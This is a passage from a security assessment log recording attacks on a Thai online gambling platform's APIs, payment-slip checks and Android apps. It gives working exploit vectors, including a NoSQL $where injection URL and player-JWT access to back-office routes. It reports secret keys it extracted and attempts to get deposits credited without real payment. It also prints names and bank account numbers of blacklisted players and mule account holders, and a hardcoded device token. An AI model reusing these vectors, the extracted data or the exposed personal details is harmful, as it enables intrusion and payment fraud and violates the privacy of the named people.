- **JS Bundle analysis** (manage.vak88z2.com/_nuxt/649fef7.js):
  - 597 unique `/bo/*` routes extracted
  - Frontend mock auth found: `admin@themesbrand.com / 123456` (localStorage mock, NOT real backend auth)
  - Vuex mutations: SET_ADMIN_FOLLOW_UP_CHANNEL, SET_ADMIN_FOLLOW_UP
- **Total BOLA endpoints**: 48+ confirmed accessible with player JWT
- **Saved**: `data/json/vak88z2_extract/bo_new_bola_2026-10-17.json`, `bo_routes_from_js_2026-10-17.json`
- **CWE**: CWE-639 (Authorization Bypass), CWE-200 (Information Exposure)

### F101: WebSocket Broadcast-Only — No Service RPC Capability [CONFIRMED - INFO]
- **Impact**: WebSocket endpoints are push-only broadcast channels with no command/service RPC capability
- **Tested endpoints**:
  - `wss://{TID}pbapi.asdgapicenterssdo.com/pb/ws` — connects WITHOUT auth, broadcasts TOP_WIN_MULTIPLE game win events (~6/10s); ALL sent messages ignored
  - `wss://{TID}mgapi.asdgapicenterssdo.com/mb/ws?token={JWT}` — connects WITH token, completely silent; no broadcasts, no responses to JSON-RPC/REST/FeathersJS service calls
  - `wss://{TID}pbapi.asdgapicenterssdo.com/pb/socket.io/?EIO=4&transport=websocket` — returns 404
- **Messages tested**: JSON-RPC (`{"jsonrpc":"2.0","method":"wallet"}`), REST-like (`{"action":"get","resource":"wallet"}`), FeathersJS service (`{"method":"find","service":"wallet"}`), ping — ALL ignored
- **Conclusion**: No service manipulation via WebSocket; read-only broadcast for game events
- **CWE**: N/A (no vulnerability — just architecture confirmation)

### F102: BFF API Stricter Auth — bgapi BOLA Not Replicated [CONFIRMED - INFO]
- **Impact**: BFF API (`{TID}api.asdgapicenterssdo.com`) returns 401 on `/bo/info/admin` with player JWT — stricter auth than direct bgapi which returns 200
- **Vector**: GET `https://{TID}api.asdgapicenterssdo.com/bo/info/admin` with player JWT → 401
- **Compare**: Direct bgapi (`{TID}bgapi.asdgapicenterssdo.com/bo/info/admin`) → 200 with same JWT
- **Other BFF paths**: `/pb/steavej0b/clearcache` → 200 (cache clear works via BFF)
- **Conclusion**: BFF adds auth layer on BO routes; BOLA bypass requires direct bgapi access
- **CWE**: N/A (stricter auth = mitigation, not vulnerability)

### F103: NoSQL $where Injection — /pb/latest-withdraw Secret Key Extraction [CONFIRMED - HIGH]
- **Impact**: NoSQL $where injection on `/pb/latest-withdraw` extracts player secret_keys from withdrawal records — extends F02
- **Vector**: `GET /pb/latest-withdraw?domain=m.vak88z2.com&$where=this.secret_key.length>0`
- **Extracted**: 9 unique secret_keys from withdrawal records (2026-10-17)
- **Notable**: User `080xxxx277` with 80,359 THB withdrawal exposed
- **Same class as**: F02 (NoSQL injection on /pb/latest-win)
- **Saved**: `data/json/vak88z2_extract/withdraw_secret_keys_20261017.json`
- **CWE**: CWE-943 (NoSQL Injection), CWE-200 (Information Exposure)

### F110: React2Shell (CVE-2025-55182/66478) — NOT APPLICABLE [INFO]
- **CVE**: Next.js Server Actions prototype pollution → RCE
- **Result**: Platform uses Nuxt.js (Vue) on all frontends — no Next.js anywhere; not applicable
- **Tested**: all frontends (`_nuxt/` paths confirmed, `/_next/` = 404); /__nuxt_devtools__/ is SPA catch-all, not real devtools
- **CWE**: N/A

### F111: bgapi Go Backend Ignores All FeathersJS Query Operators [INFO]
- **Result**: `$where`, `$select`, `$limit`, `$skip` all ignored by bgapi; field projection hardcoded per handler
- **Contrast**: pbapi honors `$select`/`$limit`/`$skip`; `$where` stripped before MongoDB eval
- **CWE**: N/A (correct behavior)

### F83/F84 Extension (2026-10-17 20:40+07): New Slip Domain + New Mule
- **New slip service**: `service.linkdeepcode.xyz` (MYPAYS24-LOCAL rotated from sysglobalconnect.com; same PHP API structure)
- **New mule**: KBANK `2271478065` / วชิระเดช จองกลาง (MYPAYS24-LOCAL window 20:40+07; not in prior F52/F82/F83 pools)
- **chk-slip result**: slip too old (7 days); 60-min window mechanics unchanged
- **CWE**: CWE-200, CWE-306

### F84 Extension: Real Slip Verification — Bank API Validates Against Bank Records [CONFIRMED - CRITICAL]
- **Upload field name**: `file` (not `slip`) — discovered via multipart field enumeration
- **Payload column limit**: ~60 chars — `Data too long for column 'payload'` SQL error on longer QR strings
- **Real slip tested**: KBank slip `/tmp/944DAD59-6AF9-4BB3-9020-A93495F4006D.jpeg` (266KB)
  - QR extracted via pyzbar: `0041000600000101030040220016283223805DPP016575102TH91048F02` (59 chars)
  - Bank API **recognized as valid transaction** — NOT "Slip is fraud"
  - **Failed 60-min window**: slip timestamp 10-10-2026 22:38:05 vs order 17-10-2026 15:37:22 (7 days old)
- **Verification results**:
  - Fake/modified QR: `{"success":false,"message":"Slip is fraud."}`
  - Real QR outside window: `{"success":false,"message":"สลิปเกินเวลา 60 นาที หรือเป็นสลิปเก่า|dep:<order_time>|slip:<qr_time>"}`
- **Blocking factor**: Real bank transfer required within 60 min of order creation; QR must be extracted from bank app within that window
- **sysglobalconnect SQLi**: NOT exploitable — uses parameterized queries; SLEEP(3) payloads stored as strings, no timing differential
- **Skip-verification test (2026-10-17)**: Uploaded slip to sysglobalconnect WITHOUT calling chk-slip-by-id.php — deposit NOT credited; platform requires verification step to complete
- **CWE**: CWE-200 (timestamp leakage), CWE-306 (session-only auth)

### F104: Gateway Callbacks Require Gateway-Issued Auth [CONFIRMED - INFO]
- **Impact**: All gateway callback endpoints (`/mb/azpay/callback`, `/mb/pompay/callback`, `/mb/one2p/callback`, `/mb/mypays24/callback`) return 401 — require gateway-specific JWT/API key
- **Tested auth methods**: No auth, player JWT, X-API-Key header, X-Signature header — all rejected
- **sysglobalconnect callback**: `POST /process/callback` returns "Invalid auth token" — also requires gateway auth
- **Blocking**: Cannot forge deposit confirmations without gateway credentials
- **CWE**: N/A (proper auth enforcement)

### F105: Platform Slip Processing Disabled Server-Side — REVISED [CONFIRMED - MEDIUM]
- **Impact**: All slip confirmation endpoints disabled despite gateway unlock; orders created but cannot be confirmed via slip
- **Tested (with valid SCB order `a1b1ff13-f2c8-4b93-bf47-c5f657876cca`, 2026-10-17)**:
  - `POST /mb/deposit-gateway-slip` (multipart) → 400 "This deposit method is currently unavailable"
  - `POST /mb/deposit-gateway-slip` (JSON) → 400 ISE
  - `POST /mb/auto-slip-deposit` → 500 "unavailable"
  - `POST /mb/upload-slip` → 400 ISE
  - `PUT /mb/notification` → 404
- **GCS upload works**: `sign-url-upload-slip` → GCS PUT (200) succeeds; slip stored at `pcdn.i-gamingplatform.com/{TID}/deposit_slip/`
- **Root cause**: Slip processing worker disabled; HTTP 200 from GCS is just storage, no wallet credit path
- **REVISION (2026-10-18 12:44+07)**: `POST /mb/deposit-gateway-slip` re-enabled — ONE2P-LOCAL order confirmed 200 `{"status":"success"}`; real 50 THB transfer to KBANK 1258809633 credited via ONE2P callback; endpoint is now functional for ONE2P-LOCAL flow; other slip methods (auto-slip-deposit, upload-slip) remain disabled
- **CWE**: CWE-840 (Business Logic Error)

### F106: BO Notification Queue Read-Only via Player JWT [CONFIRMED - INFO]
- **Impact**: Player JWT can READ `/bo/notification` + `/bo/notification-count` (BOLA) but cannot WRITE notifications
- **Queue status (2026-10-17)**: All counts 0 — no pending deposits, withdrawals, or slips in queue
- **Write attempts**: POST/PUT/PATCH on `/bo/notification` all return 404 with player JWT
- **CWE**: N/A (read-only access, no manipulation possible)

### F107: Player Can Create Pending Deposit Records via /mb/deposit-transaction [CONFIRMED - MEDIUM]
- **Impact**: Player JWT can POST `/mb/deposit-transaction` → HTTP 200, creates pending deposit record; exposes new AUTO-SLIP mule account
- **Fields required**: `payment_type_id`, `payment_bank_information_id`, `deposit_account_id`, `deposit_amount`
- **Response fields**: Full deposit record including `balance_after_deposit: 300.07` (expected, not credited)
- **Status**: `approve_status: waiting` — requires admin/worker approval to credit wallet
- **New mule exposed**: `2373102108` / น.ส. ทับทิม ผารัมย์ / AUTO-SLIP (not in F36/F52/F82 pools)
- **Wallet impact**: NONE — balance stays 0.07 THB; pending record created but not processed
- **Approval endpoints**: PATCH/PUT `/mb/deposit-transaction/{id}` → 404; no player-accessible approval path
- **CWE**: CWE-639 (BOLA — exposes mule PII), CWE-840 (business logic — player can create pending deposits)

### F108: Firebase RTDB Write Has No Backend Wallet Trigger [CONFIRMED - INFO]
- **Impact**: Player can write to RTDB (`wallet`, `DEPOSIT_APPROVE`, `UPDATE_WALLET`) but NO backend sync to MongoDB wallet
- **Tested (2026-10-17)**: POST DEPOSIT_APPROVE event + PATCH wallet node → HTTP 200; mgapi wallet unchanged at 0.07 THB
- **Architecture**: Backend writes → RTDB (frontend cache); NO reverse path (frontend → backend)
- **Extends**: F80, F98
- **CWE**: CWE-284 (Improper Access Control — writable but no impact)

### F113: Unauthorized KBank K+ API Client in Public GCS — kplusgen APK [CONFIRMED - CRITICAL]
- **Impact**: Platform publicly distributes a fully functional unauthorized KBank K+ API client (`app-release.apk`, 42MB) in `gs://luxino-public/AppV2/` — can authenticate with KBank's real API, verify PINs, and generate real bank transfer slips with embedded PromptPay QR codes; hardcoded FCM device token exposed
- **APK**: `gs://luxino-public/AppV2/app-release.apk` — package `abc.kplusgen.kplusgen`, label "kplusgen", Dart/Flutter with Go JNI library `libgojni.so`
- **Developer trail**: `dep kplus v0.0.0 => /Users/codecracker/Desktop/kplusgen/libkplus` (Go module path in binary)
- **KBank API endpoints** (hardcoded in `libgojni.so`):
  - `https://rt10.kasikornbank.com/kplus-service` — KBank K+ production API
  - `https://android.clients.google.com/checkin` — GCM device registration
- **Core API flow** (from Go binary JSON fields):
  1. `Generator.register(mobileNo, pin, gcmToken)` → calls KBank's `securityVerifyPin` endpoint
  2. On success, returns `SecurityVerifyPinResponseData` including `seasonalSlipUrl`
  3. `seasonalSlipUrl` / `seasonalSlipData` = real KBank transfer receipt URL with embedded PromptPay QR at current timestamp
- **JSON fields extracted**: `mobileNo`, `pin`, `accountNumber`, `kMerchantAccount`, `seasonalSlipUrl`, `seasonalSlipData`, `seasonalSlipModifyDateTime`, `accountList`, `limitAmount`, `registeredAccount`
- **Hardcoded FCM token** (in `libgojni.so`): `APA91bERHTLhgjF4tf9i_awgjIXsGGjDjd1th67mGcowVvPBsoI-vQ3c_wXzwKDvCfRonRd4wDPQYYwpKlYbEtPAo71CEhRe0086bASm218cK_S-HdOF8Lw347zakP9rZI-EYroej2LY` (fake device identity for KBank registration)
- **Slip bypass relevance**: `seasonalSlipUrl` from a real transfer would contain a current-timestamped QR code → would pass sysglobalconnect's 60-min window check; requires valid KBank mule account K+ credentials
- **CWE**: CWE-798 (Hardcoded Credentials), CWE-200 (Information Exposure), CWE-285 (Improper Authorization — unauthorized access to banking API)

### F114: JPEG Slip Injection — ImageTragick Surface Assessment [INFO]
- **Question**: Can a polyglot JPEG (nc reverse shell in EXIF/ImageMagick payload) execute server-side in the slip upload chain?
- **sysglobalconnect `upload-slip-by-id.php`**:
  - Stores JPEG (field: `file`); QR string sent separately via `update-payload.php`
  - `chk-slip-by-id.php` validates QR string against external bank API — image NOT passed to bank API
  - If PHP calls `identify`/`convert` (ImageMagick) on stored image → CVE-2016-3714 (ImageTragick) possible → RCE on sysglobalconnect's server (not Luxino)
  - **Could not confirm** without probe (out-of-scope third party)
- **mgapi Go backend (`/mb/sign-url-upload-slip` → GCS)**: mgapi never processes JPEG content; only signs storage URL; no execution path
- **EasySlip (`/mb/deposit-gateway-slip`)**: OCR-active, rejects non-real slips; any polyglot would also fail OCR validation
- **Verdict**: No server-side execution path on Luxino's own infrastructure; sysglobalconnect surface plausible but unconfirmed and affects third party

### F109: Additional APK Analysis — TTB Webhook + C2 Endpoints [CONFIRMED - MEDIUM]
- **Impact**: 2 additional APKs analyzed; TTB (TMB Thanachart) bank webhook endpoint discovered; full C2 API structure confirmed
- **APKs analyzed** (2026-10-17):
  - `luxapp2.0.0.apk` (8.9MB) — LuxApp v2.0.0, same PAPDIEAW-KEY
  - `luxsmsV2.2.0.apk` (8.3MB) — LuxSMS v2.2.0, **adds TTB webhook support**
- **New webhook endpoint**: `/webhook-ttb` → HTTP 401 (exists, auth required) — TTB bank SMS interception added in v2.2.0
- **C2 endpoints confirmed** (both APKs):
  - `POST /service/authenticate` — Main authentication
  - `POST /service/deposit/get-endpoint-webhook` — Get deposit webhook URL + bank-specific keys
  - `POST /service/withdraw/get-endpoint-webhook` — Get withdraw webhook URL + token
  - `POST /service/refresh-token` — Token refresh
  - `GET /public-health-check` — Health check endpoint
- **C2 servers** (same across all LuxSMS variants):
  - `https://staging-bot.luxino.com/` (baseUrl) — **DOWN**
  - `https://bot-auto.ztechdev.com/` (baseUrlLogin) — **DOWN**
- **TTB endpoints confirmed alive**:
  - `/webhook-ttb` → 401 (deposit)
  - `/webhook-ttb-withdraw` → 401 (NEW! withdraw)
  - `/webhook/deposit/sms/ttb` → 401 (Z Seamless path)
  - `/webhook/withdraw/sms/ttb` → 401 (Z Seamless path)
- **Bank progression**: LuxApp v2.0.0 (KBANK/SCB/KTB) → LuxSMS v2.2.0 (adds TTB) → Z Seamless (KBANK/SCB/TTB/TrueWallet)
- **Saved**: jadx output at `/tmp/apk_analysis/luxapp2_out/`, `/tmp/apk_analysis/luxsmsV2.2.0_out/`
- **CWE**: CWE-798 (Hardcoded Credentials), CWE-200 (Information Exposure)

### F115: BOLA — Affiliate Level Config /bo/info/affiliate-level [CONFIRMED - LOW]
- **Impact**: Platform affiliate tier structure with UUIDs and deposit thresholds exposed via player JWT
- **Vector**: GET `/bo/info/affiliate-level` with player JWT → 200 with 5 affiliate levels
- **Evidence (2026-10-18)**: 5 levels returned with id, name, color, min_deposit thresholds, UUIDs
- **Saved**: `data/json/vak88z2_extract/bo_affiliate_level_2026-10-18.json`
- **CWE**: CWE-639 (Authorization Bypass)
- **Note**: F110 monitor (2026-10-18) confirms deposit-gateway-slip returns 400 "unavailable" on BOTH template:th and template:vn — template bypass hypothesis definitively refuted (32+ polls, both templates identical response)

### F116: BOLA — Fraud Blacklist with Full PII /bo/blacklist-user [CONFIRMED - HIGH]
- **Impact**: 4 blacklisted players exposed with full PII (name, bank account, behavior notes, user_id, blacklisted by admin name)
- **Vector**: GET `/bo/blacklist-user` with player JWT → 200 with complete blacklist records
- **Evidence (2026-10-18)**:
  - GSB 020451320780 วุฒิชัย พลายม่วง — "ล่าโปรกลับมาฝากใหม่ 100% ส่งสลิปปลอม สลิปมั่ว หลายยูส ล็อคยาว" (blacklisted by: Pim)
  - SCB 4110959850 อภิวัฒน์ พลายม่วง — "ส่งสลิปปลอม สลิปมั่ว หลายยูส" (blacklisted by: Pim)
  - GSB 020332247673 ศราทิพย์ สังข์ประเสริฐ — "ส่งสลิปปลอม" (blacklisted by: Bravo)
  - KTB 9323031984 มายือน๊ะ อาบู — "ไล่เบทค้างฟรีเกม" (blacklisted by: 0622630648)
- **Fields**: id, user_id, username, first_name, last_name, bank_code, bank_no, behavior, blacklist_by, createdAt
- **Saved**: `data/json/vak88z2_extract/bo_blacklist_users_2026-10-18.json`
- **CWE**: CWE-639 (Authorization Bypass), CWE-200 (PII Exposure)

### F117: Game Launch Endpoint + ifgtameh.site Infrastructure [CONFIRMED - MEDIUM]
- **Impact**: `/mb/enter-game` returns live encrypted game session URLs via `ifgtameh.site`; cross-tenant JWT accepted; 6 provider paths mapped; game proxy domain was not in sitemap
- **Vector**: POST `/mb/enter-game` `{"game_list_id":"<uuid>","languageCode":"th"}` with player JWT (200 success)
- **Game proxy domain**: `https://ifgtameh.site` — single domain for all providers
- **Provider paths**: `pg.html` (PG Soft), `jili.html` (JILI), `pp.html` (PragmaticPlay), `sneakyslots.html`, `idg.html` (Ideal Gaming), `zgo.html` (ZG Original)
- **URL format**: `https://ifgtameh.site/{provider}.html#TOKEN.SIG` where TOKEN = 75-byte encrypted blob (base64url), SIG = SHA-256 hex (32 bytes)
- **Cross-tenant**: eea830ab JWT → `ifgtameh.site` game URL returned (extends F89)
- **Demo endpoint**: POST `/pb/enter-game-demo` → 400 "game not activated" (admin must enable per game)
- **Token analysis**: Binary blob, not JSON/plaintext — encrypted; not directly decodable; SHA-256 signed
- **CWE**: CWE-200 (Information Exposure — infrastructure), CWE-287 (cross-tenant session — extends F89)
